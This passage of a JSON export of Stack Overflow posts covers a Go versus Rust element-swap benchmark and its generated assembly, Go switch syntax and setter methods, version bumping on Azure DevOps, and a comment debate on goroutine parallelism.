<code>vec![]</code> macro:</p>\n\n<pre><code>let mut work: Vec&lt;f64&gt; = vec![0.0, 1.0];    \n\nfor _x in 1..100000000 {\n    work.swap(0, 1); \n}\n</code></pre>\n\n<p>So is this code faster? Yes. Have a look at <a href=\"https://rust.godbolt.org/z/O3Uv-Z\" rel=\"noreferrer\">what assembly is generated</a>:</p>\n\n<pre><code>example::main:\n  mov eax, 99999999\n.LBB0_1:\n  add eax, -11\n  jne .LBB0_1\n  ret\n</code></pre>\n\n<p>On my PC, this runs about 30 times faster than your original code. </p>\n\n<p>Why does the assembly still contain this loop that is doing nothing? Why isn't the compiler able to see that two <code>push</code>es are the same as <code>vec![0.0, 1.0]</code>? Both very good questions and both probably point to a flaw in LLVM or the Rust compiler. </p>\n\n<p>However, sadly, there isn't much useful information to gain from your micro benchmark. Benchmarking is hard, like really hard. There are so many pitfalls that even professionals fall for. In your case, the benchmark is flawed in several ways. For a start, you never observe the contents of the vector later (it is never used). That's why a good compiler can remove all code that even touches the vector (as the Rust compiler did above). So that's not good. </p>\n\n<p>Apart from that, this does not resemble any real performance critical code. Even if the vector would be observed later, swapping an odd number of times equals a single swap. So unless you wanted to see if the optimizer could understand this swapping rule, sadly your benchmark isn't really useful.  </p>\n"}, {"comments": [{"owner": {"reputation": 269529, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 2, "creation_date": 1540234277, "post_id": 52935309, "comment_id": 92780912, "body": "<i>the time you measured was dominated by the startup and initialization of the processes</i> \u2014 the code OP presented contains the time invocations. Are you stating that both Go and Rust code are running some other code besides the loop between <code>time.Now</code> / <code>time.Since</code> or <code>Instant::now</code> / <code>now.elapsed</code>?"}, {"owner": {"reputation": 42799, "user_id": 720999, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/04ee78e90161fa1c4dce14d615315160?s=128&d=identicon&r=PG", "display_name": "kostix", "link": "https://stackoverflow.com/users/720999/kostix"}, "reply_to_user": {"reputation": 269529, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1540287113, "post_id": 52935309, "comment_id": 92799378, "body": "@Shepmaster, yes, you&#39;re right. I stand corrected, thanks."}], "tags": [], "owner": {"reputation": 42799, "user_id": 720999, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/04ee78e90161fa1c4dce14d615315160?s=128&d=identicon&r=PG", "display_name": "kostix", "link": "https://stackoverflow.com/users/720999/kostix"}, "is_accepted": false, "score": 2, "last_activity_date": 1540231749, "creation_date": 1540231749, "answer_id": 52935309, "question_id": 52933875, "link": "https://stackoverflow.com/questions/52933875/why-is-swapping-elements-of-a-float64-in-go-faster-than-swapping-elements-of-a/52935309#52935309", "title": "Why is swapping elements of a []float64 in Go faster than swapping elements of a Vec&lt;f64&gt; in Rust?", "body": "<p>(Not an answer) but to augment what Lukas wrote,\nhere's what Go 1.11 <a href=\"https://go.godbolt.org/z/b9rEEE\" rel=\"nofollow noreferrer\">generates</a>\nfor the loop itself:</p>\n\n<pre><code>    xorl    CX, CX\n    movsd   8(AX), X0\n    movsd   (AX), X1\n    movsd   X0, (AX)\n    movsd   X1, 8(AX)\n    incq    CX\n    cmpq    CX, $100000000\n    jlt     68\n</code></pre>\n\n<p>(Courtesy of <a href=\"https://godbolt.org\" rel=\"nofollow noreferrer\">https://godbolt.org</a>)</p>\n\n<p>In either case, note that most probably the time you measured was dominated by the startup and initialization of the processes, so you did not actually measured the speed of the execution of the loops. IOW your approach is not correct.</p>\n"}], "owner": {"reputation": 11, "user_id": 10541337, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d810ea7b8fecfdb2ab3a9871a95315e?s=128&d=identicon&r=PG&f=1", "display_name": "Kyle", "link": "https://stackoverflow.com/users/10541337/kyle"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 222, "favorite_count": 0, "accepted_answer_id": 52934180, "answer_count": 2, "score": -6, "last_activity_date": 1564857538, "creation_date": 1540225832, "last_edit_date": 1564857538, "question_id": 52933875, "link": "https://stackoverflow.com/questions/52933875/why-is-swapping-elements-of-a-float64-in-go-faster-than-swapping-elements-of-a", "title": "Why is swapping elements of a []float64 in Go faster than swapping elements of a Vec&lt;f64&gt; in Rust?", "body": "<p>I have two (equivalent?) programs, one in Go the other in Rust. The average execution time is:</p>\n\n<ul>\n<li>Go ~169ms  </li>\n<li>Rust ~201ms</li>\n</ul>\n\n<p><strong>Go</strong></p>\n\n<pre class=\"lang-golang prettyprint-override\"><code>package main\n\nimport (\n    \"fmt\"\n    \"time\"\n)\n\nfunc main() {\n    work := []float64{0.00, 1.00}\n    start := time.Now()\n\n    for i := 0; i &lt; 100000000; i++ {\n        work[0], work[1] = work[1], work[0]\n    }\n\n    elapsed := time.Since(start)\n    fmt.Println(\"Execution time: \", elapsed)\n}\n</code></pre>\n\n<p><strong>Rust</strong></p>\n\n<p>I compiled with <code>--release</code></p>\n\n<pre class=\"lang-rust prettyprint-override\"><code>use std::time::Instant;\n\nfn main() {\n    let mut work: Vec&lt;f64&gt; = Vec::new();\n    work.push(0.00);\n    work.push(1.00);\n\n    let now = Instant::now();\n\n    for _x in 1..100000000 {\n        work.swap(0, 1); \n    }\n\n    let elapsed = now.elapsed();\n    println!(\"Execution time: {:?}\", elapsed);\n}\n</code></pre>\n\n<p>Is Rust less performant than Go in this instance?  Could the Rust program be written in an idiomatic way, to execute faster?</p>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 1, "creation_date": 1540218607, "post_id": 52931751, "comment_id": 92772733, "body": "Why are you using <code>switch true</code> with expression cases that all test <code>flag</code>&#39;s value instead of just doing a normal <code>switch flag</code> here?"}, {"owner": {"reputation": 18601, "user_id": 965900, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5KqAT.png?s=128&g=1", "display_name": "mkopriva", "link": "https://stackoverflow.com/users/965900/mkopriva"}, "edited": false, "score": 0, "creation_date": 1540218795, "post_id": 52931751, "comment_id": 92772832, "body": "<a href=\"https://play.golang.org/p/kmFkWz2hQAM\" rel=\"nofollow noreferrer\">play.golang.org/p/kmFkWz2hQAM</a>"}, {"owner": {"reputation": 645, "user_id": 6192772, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/74209ab5f4b99c81cf444d87f85fcc36?s=128&d=identicon&r=PG&f=1", "display_name": "NSS", "link": "https://stackoverflow.com/users/6192772/nss"}, "reply_to_user": {"reputation": 18601, "user_id": 965900, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5KqAT.png?s=128&g=1", "display_name": "mkopriva", "link": "https://stackoverflow.com/users/965900/mkopriva"}, "edited": false, "score": 0, "creation_date": 1540219331, "post_id": 52931751, "comment_id": 92773200, "body": "@mkopriva - please add it as answer :) thank you very much! i was a bit confused ..."}], "answers": [{"tags": [], "owner": {"reputation": 18601, "user_id": 965900, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5KqAT.png?s=128&g=1", "display_name": "mkopriva", "link": "https://stackoverflow.com/users/965900/mkopriva"}, "is_accepted": true, "score": 3, "last_activity_date": 1540219537, "creation_date": 1540219537, "answer_id": 52932058, "question_id": 52931751, "link": "https://stackoverflow.com/questions/52931751/golang-switch-for-a-types-returning-boolean-values/52932058#52932058", "title": "Golang switch for a types returning boolean values", "body": "<pre><code>func validate(flag string) (bool, bool, error) {\n    switch flag {\n    case \"\":\n        return true, true, nil\n    case \"types\":\n        return true, false, nil\n    case \"ast\":\n        return false, true, nil\n    }\n\n    return false, false, errors.New(\"wrong order of arguments\")\n}\n</code></pre>\n\n<p>Have a look at the <a href=\"https://golang.org/ref/spec#Expression_switches\" rel=\"nofollow noreferrer\">docs</a> for a fleshed out description of switch.</p>\n"}], "owner": {"reputation": 645, "user_id": 6192772, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/74209ab5f4b99c81cf444d87f85fcc36?s=128&d=identicon&r=PG&f=1", "display_name": "NSS", "link": "https://stackoverflow.com/users/6192772/nss"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1613, "favorite_count": 1, "closed_date": 1540263369, "accepted_answer_id": 52932058, "answer_count": 1, "score": -2, "last_activity_date": 1540219537, "creation_date": 1540218513, "question_id": 52931751, "link": "https://stackoverflow.com/questions/52931751/golang-switch-for-a-types-returning-boolean-values", "closed_reason": "Opinion-based", "title": "Golang switch for a types returning boolean values", "body": "<p>I've the following function which w<strong>orks OK</strong>,\nBut I wonder if there is <strong>cleaner</strong> way to write it in Golang</p>\n\n<p>the function get a flag and according to the value(string value) provide two Boolean response (and error) </p>\n\n<pre><code>func validate(flag string) (bool, bool, error) {\n    switch true {\n    case flag == \"\":\n        return true, true, nil\n    case flag == \"types\":\n        return true, false, nil\n    case flag == \"ast\":\n        return false, true, nil\n    }\n\n    return false, false, errors.New(\"wrong order of arguments\")\n}\n</code></pre>\n"}, {"tags": ["go", "azure-devops"], "comments": [{"owner": {"reputation": 407, "user_id": 3461549, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73440cf71c71747a010d5114de459b10?s=128&d=identicon&r=PG&f=1", "display_name": "msound", "link": "https://stackoverflow.com/users/3461549/msound"}, "edited": false, "score": 1, "creation_date": 1540266803, "post_id": 52931616, "comment_id": 92790423, "body": "I attempted a similar Go project using libgit2, and didn&#39;t get far. I am thinking of trying again using git2go. You can find non-working code here if you are interested: <a href=\"https://github.com/msound/tagger\" rel=\"nofollow noreferrer\">github.com/msound/tagger</a>"}], "owner": {"reputation": 13980, "user_id": 3554264, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/TbLcc.jpg?s=128&g=1", "display_name": "Christian Hujer", "link": "https://stackoverflow.com/users/3554264/christian-hujer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 340, "favorite_count": 1, "answer_count": 0, "score": 2, "last_activity_date": 1540218096, "creation_date": 1540218096, "question_id": 52931616, "link": "https://stackoverflow.com/questions/52931616/automatic-version-bumping-on-azure-devops-like-jenkinsmaven", "title": "Automatic version bumping on Azure DevOps (like Jenkins+Maven)", "body": "<p>In Jenkins+Maven, there is the possibility to automatically bump the version of software using a plugin. For example, the current version in the <code>pom.xml</code> might be <code>1.0.0-SNAPSHOT</code>. When the plugin is used, it will change the version in the <code>pom.xml</code> to <code>1.0.0</code>, commit that change, tag the commit, perform a build, publish the artifact, change the version in the <code>pom.xml</code> to <code>1.0.1-SNAPSHOT</code>, commit and push that change.</p>\n\n<p>I would like to do something similar in a Go project on Azure DevOps, and before writing my own script that would do that, I wonder if there is something ready-made like this available on Azure DevOps already.</p>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540217305, "post_id": 52931254, "comment_id": 92771877, "body": "&quot;But i couldn&#39;t proceed further&quot; why? What problem did you actually run into? Be specific with your question."}], "answers": [{"comments": [{"owner": {"reputation": 2754, "user_id": 849632, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/NDhZK.jpg?s=128&g=1", "display_name": "Arun", "link": "https://stackoverflow.com/users/849632/arun"}, "edited": false, "score": 0, "creation_date": 1540217251, "post_id": 52931300, "comment_id": 92771842, "body": "I haven&#39;t seen a function defined this type .. what is this called ? i generally know that a function will be of this type <code>func &lt;name&gt; (&lt;parameter&gt;) &lt;return_type&gt; {&#47;&#47;define}</code> . But what is this type of function is called as ?"}], "tags": [], "owner": {"reputation": 1121, "user_id": 5904368, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/3f47ff4899eb45da5e5d79d25fdfe474?s=128&d=identicon&r=PG", "display_name": "Tomasz Bawor", "link": "https://stackoverflow.com/users/5904368/tomasz-bawor"}, "is_accepted": true, "score": 10, "last_activity_date": 1540221836, "last_edit_date": 1540221836, "creation_date": 1540217088, "answer_id": 52931300, "question_id": 52931254, "link": "https://stackoverflow.com/questions/52931254/setter-in-golang/52931300#52931300", "title": "Setter in GoLang", "body": "<p>If you want to have setter you should use method declaration:</p>\n\n<pre><code>func(pct *ProtectedCustomType) SetAge (age int)  {\n    pct.age = age\n}\n</code></pre>\n\n<p>and then you will be able to use: </p>\n\n<pre><code>pct.SetAge(23)\n</code></pre>\n\n<p>This kind of declarations enables you to execute function on your structure,\nby using</p>\n\n<p><code>(pct *ProtectedCustomType)</code> </p>\n\n<p>Your are passing pointer to your struct so operations on it changes its internal \nrepresentation.</p>\n\n<p>You can read more about this kind of function under <a href=\"http://golangtutorials.blogspot.com/2011/06/methods-on-structs.html\" rel=\"nofollow noreferrer\">this link</a>, or\nunder <a href=\"https://golang.org/ref/spec#Method_declarations\" rel=\"nofollow noreferrer\">official documentation</a>.</p>\n"}], "owner": {"reputation": 2754, "user_id": 849632, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/NDhZK.jpg?s=128&g=1", "display_name": "Arun", "link": "https://stackoverflow.com/users/849632/arun"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2911, "favorite_count": 0, "accepted_answer_id": 52931300, "answer_count": 1, "score": 1, "last_activity_date": 1540227443, "creation_date": 1540216918, "last_edit_date": 1540227443, "question_id": 52931254, "link": "https://stackoverflow.com/questions/52931254/setter-in-golang", "title": "Setter in GoLang", "body": "<p>Sorry for the basic question. I am new to GoLang.</p>\n\n<p>I have a custom type named <code>ProtectedCustomType</code> and I don't want the variables within that to be <code>set</code> directly by the caller, rather want a <code>Getter</code> / <code>Setter</code> methods to do that </p>\n\n<p>Below is my <code>ProtectedCustomType</code></p>\n\n<pre><code>package custom\n\ntype ProtectedCustomType struct {\n    name string\n    age int\n    phoneNumber int\n}\n\nfunc SetAge (pct *ProtectedCustomType, age int)  {\n    pct.age=age\n} \n</code></pre>\n\n<p>And here is my <code>main</code> function</p>\n\n<pre><code>import (\n    \"fmt\"\n    \"./custom\"\n)\nvar print =fmt.Println\n\nfunc structCheck2() {\n    pct := ProtectedCustomType{}\n    custom.SetAge(pct,23)\n\n    print (pct.Name)\n}\n\nfunc main() {\n    //structCheck()\n    structCheck2()\n}\n</code></pre>\n\n<p>But i couldn't proceed further .. can you please help me on how to achieve getter-setter concept in GoLang ?</p>\n"}, {"tags": ["go", "concurrency", "parallel-processing"], "comments": [{"owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 4, "creation_date": 1540208359, "post_id": 52928162, "comment_id": 92766074, "body": "It doesn&#39;t mean anything. The interesting thing about it that it simply does not matter and you should not care. This is concurrency. Things are done concurrently and that is all there is to say. Things happen independently and simultaneous. Nothing to worry here. What happens on the physical hardware level: You should not care. If you have just one core: Nothing ever will happen &quot;in parallel&quot;. If you have more cores: Some things might or might not happe nin parallel. The thing about concurrent execution is that you do not need to care about physical parallelism."}, {"owner": {"reputation": 50179, "user_id": 594589, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/0f9d5953607841d6a50b843a1107e51e?s=128&d=identicon&r=PG", "display_name": "dm03514", "link": "https://stackoverflow.com/users/594589/dm03514"}, "reply_to_user": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 0, "creation_date": 1540212551, "post_id": 52928162, "comment_id": 92768627, "body": "@Volker I def agree in general, but what about if you&#39;re trying to optimize/benchmark a CPU bound operation? I guess if there are configurable goroutine pool sizes load testing and choosing the right config sizes are still agnostic to OS because the data will eventually settle on the correct configuration? ie if we&#39;re doing hashing concurrently, and initially setting a pool size/# concurrent hashes to a large number, we&#39;ll eventually settle on something closer to the number of cores available?"}, {"owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "reply_to_user": {"reputation": 50179, "user_id": 594589, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/0f9d5953607841d6a50b843a1107e51e?s=128&d=identicon&r=PG", "display_name": "dm03514", "link": "https://stackoverflow.com/users/594589/dm03514"}, "edited": false, "score": 2, "creation_date": 1540213070, "post_id": 52928162, "comment_id": 92768961, "body": "@dm03514 if you have this sort of problem you know what you are doing and how to arrange data to keep your cores busy and your memory pipelines full. Basically Go has <i>no</i> tunable parts, it is not Java. You limit goroutines with GOMAXPROCS and garbage collection with GOGC. That&#39;s it."}], "answers": [{"comments": [{"owner": {"reputation": 3865, "user_id": 4829408, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/9ff8f70cf1f3f172084d5042abf22d64?s=128&d=identicon&r=PG&f=1", "display_name": "Src", "link": "https://stackoverflow.com/users/4829408/src"}, "edited": false, "score": 0, "creation_date": 1540207798, "post_id": 52928265, "comment_id": 92765779, "body": "I&#39;ve already watched that video by Rob Pike. So okay, they are starting at the same time, but my question was - did they executing at the same time? I mean like having 2 threads with goroutines that are running parallel"}, {"owner": {"reputation": 1948, "user_id": 8690313, "user_type": "registered", "accept_rate": 80, "profile_image": "https://lh4.googleusercontent.com/-hQ93tpA6Lmk/AAAAAAAAAAI/AAAAAAAAB2I/7F3CoNnnhts/photo.jpg?sz=128", "display_name": "Prajval M", "link": "https://stackoverflow.com/users/8690313/prajval-m"}, "reply_to_user": {"reputation": 3865, "user_id": 4829408, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/9ff8f70cf1f3f172084d5042abf22d64?s=128&d=identicon&r=PG&f=1", "display_name": "Src", "link": "https://stackoverflow.com/users/4829408/src"}, "edited": false, "score": 0, "creation_date": 1540207908, "post_id": 52928265, "comment_id": 92765833, "body": "If your hardware is capable then they might be executing at the same instant of time. Else both the goroutines will be running at the same time."}, {"owner": {"reputation": 3865, "user_id": 4829408, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/9ff8f70cf1f3f172084d5042abf22d64?s=128&d=identicon&r=PG&f=1", "display_name": "Src", "link": "https://stackoverflow.com/users/4829408/src"}, "edited": false, "score": 0, "creation_date": 1540208339, "post_id": 52928265, "comment_id": 92766058, "body": "So does that means, that we can call golang parallel language?"}, {"owner": {"reputation": 1948, "user_id": 8690313, "user_type": "registered", "accept_rate": 80, "profile_image": "https://lh4.googleusercontent.com/-hQ93tpA6Lmk/AAAAAAAAAAI/AAAAAAAAB2I/7F3CoNnnhts/photo.jpg?sz=128", "display_name": "Prajval M", "link": "https://stackoverflow.com/users/8690313/prajval-m"}, "reply_to_user": {"reputation": 3865, "user_id": 4829408, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/9ff8f70cf1f3f172084d5042abf22d64?s=128&d=identicon&r=PG&f=1", "display_name": "Src", "link": "https://stackoverflow.com/users/4829408/src"}, "edited": false, "score": 0, "creation_date": 1540208472, "post_id": 52928265, "comment_id": 92766136, "body": "NO. Calling it parallel language cannot be generalized. Parallelism is just a manifestation of concurrency."}, {"owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "reply_to_user": {"reputation": 3865, "user_id": 4829408, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/9ff8f70cf1f3f172084d5042abf22d64?s=128&d=identicon&r=PG&f=1", "display_name": "Src", "link": "https://stackoverflow.com/users/4829408/src"}, "edited": false, "score": 0, "creation_date": 1540208579, "post_id": 52928265, "comment_id": 92766208, "body": "@Src Whether you can call Go a &quot;parallel language&quot; depends on your definition of &quot;parallel language&quot;. You can call it a &quot;low level&quot; and &quot;high level&quot; and &quot;green-yellow&quot; and &quot;parallel&quot; or &quot;sequential&quot;. But this name calling does not change anything and is not helpful. So why bother."}, {"owner": {"reputation": 3865, "user_id": 4829408, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/9ff8f70cf1f3f172084d5042abf22d64?s=128&d=identicon&r=PG&f=1", "display_name": "Src", "link": "https://stackoverflow.com/users/4829408/src"}, "reply_to_user": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 0, "creation_date": 1540209664, "post_id": 52928265, "comment_id": 92766895, "body": "@Volker I&#39;m just trying to wrap my head around that, because almost everybody saying that golang can&#39;t execute two different goroutines at once, scheduler will have to switch between the task, when one of them will be blocked.. So i&#39;m trying to understand that, because on the other side, there are articles (like i provided in the question) saying that if GOMAXPROCS will be equal to &gt; 1, and you&#39;ll have more that 1 CPU - things will be executing at the same time. This confuses me."}, {"owner": {"reputation": 1948, "user_id": 8690313, "user_type": "registered", "accept_rate": 80, "profile_image": "https://lh4.googleusercontent.com/-hQ93tpA6Lmk/AAAAAAAAAAI/AAAAAAAAB2I/7F3CoNnnhts/photo.jpg?sz=128", "display_name": "Prajval M", "link": "https://stackoverflow.com/users/8690313/prajval-m"}, "edited": false, "score": 0, "creation_date": 1540209889, "post_id": 52928265, "comment_id": 92767021, "body": "If you are using a language like c, c++ where there is no option to run codes concurrently you&amp;#39;ll have to worry about using threads, openmp and stuff. In Go you have go routines which asks developer not to think about any of this and just code the design he wants and leave concurrency / parallelism (whatever u may call ) to the language"}, {"owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "reply_to_user": {"reputation": 3865, "user_id": 4829408, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/9ff8f70cf1f3f172084d5042abf22d64?s=128&d=identicon&r=PG&f=1", "display_name": "Src", "link": "https://stackoverflow.com/users/4829408/src"}, "edited": false, "score": 0, "creation_date": 1540210955, "post_id": 52928265, "comment_id": 92767590, "body": "@Src &quot;because almost everybody saying that golang can&#39;t execute two different goroutines at once&quot; nobody says this because this is 100% wrong. Go will happily execute up to the number of available cores goroutines in parallel. The number of available cores is limited by, well the number of cores you actually have and second by GOMAXPROCS. Forget about all this now and forever. GOMAXPROCS <i>was</i> a thing in 2015. It is nomore."}, {"owner": {"reputation": 3865, "user_id": 4829408, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/9ff8f70cf1f3f172084d5042abf22d64?s=128&d=identicon&r=PG&f=1", "display_name": "Src", "link": "https://stackoverflow.com/users/4829408/src"}, "reply_to_user": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 0, "creation_date": 1540211183, "post_id": 52928265, "comment_id": 92767718, "body": "@Volker so i&#39;m loosing the point.. if it can execute things in parallel &quot;up to a number of available cores&quot; it&#39;s parallelism. Or we just call it concurrent language, because it is might not always be the case?"}, {"owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "reply_to_user": {"reputation": 3865, "user_id": 4829408, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/9ff8f70cf1f3f172084d5042abf22d64?s=128&d=identicon&r=PG&f=1", "display_name": "Src", "link": "https://stackoverflow.com/users/4829408/src"}, "edited": false, "score": 0, "creation_date": 1540212260, "post_id": 52928265, "comment_id": 92768440, "body": "@Src There is <i>no</i> point in this discussion. Nobody is interested in a discussion whether Go should be called a &quot;parallel&quot; or a &quot;concurrent&quot; language. The language constructs allow the construction of concurrent programs. These concurrent programs may or may not executed in parallel and this makes no difference. Assigning labels like &quot;concurrent&quot; or &quot;parallel&quot; or &quot;green&quot; or whatever is useless linguistic/taxonomical effort."}, {"owner": {"reputation": 3865, "user_id": 4829408, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/9ff8f70cf1f3f172084d5042abf22d64?s=128&d=identicon&r=PG&f=1", "display_name": "Src", "link": "https://stackoverflow.com/users/4829408/src"}, "reply_to_user": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 0, "creation_date": 1540212342, "post_id": 52928265, "comment_id": 92768483, "body": "@Volker I&#39;m not interested in giving labels to the language either, but i was just curios about how it&#39;s working under the hood."}, {"owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "reply_to_user": {"reputation": 3865, "user_id": 4829408, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/9ff8f70cf1f3f172084d5042abf22d64?s=128&d=identicon&r=PG&f=1", "display_name": "Src", "link": "https://stackoverflow.com/users/4829408/src"}, "edited": false, "score": 0, "creation_date": 1540212355, "post_id": 52928265, "comment_id": 92768494, "body": "@Src Go for sure is <i>NOT</i> a parallel programming language as you <i>cannot</i> force two statements to be executed &quot;in parallel&quot;. But of corse do things happen in parallel if you execute a Go program. Let&#39;s just stop this naming thing."}, {"owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "reply_to_user": {"reputation": 3865, "user_id": 4829408, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/9ff8f70cf1f3f172084d5042abf22d64?s=128&d=identicon&r=PG&f=1", "display_name": "Src", "link": "https://stackoverflow.com/users/4829408/src"}, "edited": false, "score": 0, "creation_date": 1540212424, "post_id": 52928265, "comment_id": 92768536, "body": "@Src Then it is simple. All cores up to GOMAXPROCS are used if there is work to be done. Dead simple."}, {"owner": {"reputation": 3865, "user_id": 4829408, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/9ff8f70cf1f3f172084d5042abf22d64?s=128&d=identicon&r=PG&f=1", "display_name": "Src", "link": "https://stackoverflow.com/users/4829408/src"}, "reply_to_user": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 0, "creation_date": 1540212507, "post_id": 52928265, "comment_id": 92768601, "body": "@Volker Great. So we can assume, that if we&#39;ll have 4 available cores, and there are 4 different goroutines, they will be executed simultaneously?"}, {"owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "reply_to_user": {"reputation": 3865, "user_id": 4829408, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/9ff8f70cf1f3f172084d5042abf22d64?s=128&d=identicon&r=PG&f=1", "display_name": "Src", "link": "https://stackoverflow.com/users/4829408/src"}, "edited": false, "score": 1, "creation_date": 1540212553, "post_id": 52928265, "comment_id": 92768629, "body": "Let us <a href=\"https://chat.stackoverflow.com/rooms/182266/discussion-between-volker-and-src\">continue this discussion in chat</a>."}], "tags": [], "owner": {"reputation": 1948, "user_id": 8690313, "user_type": "registered", "accept_rate": 80, "profile_image": "https://lh4.googleusercontent.com/-hQ93tpA6Lmk/AAAAAAAAAAI/AAAAAAAAB2I/7F3CoNnnhts/photo.jpg?sz=128", "display_name": "Prajval M", "link": 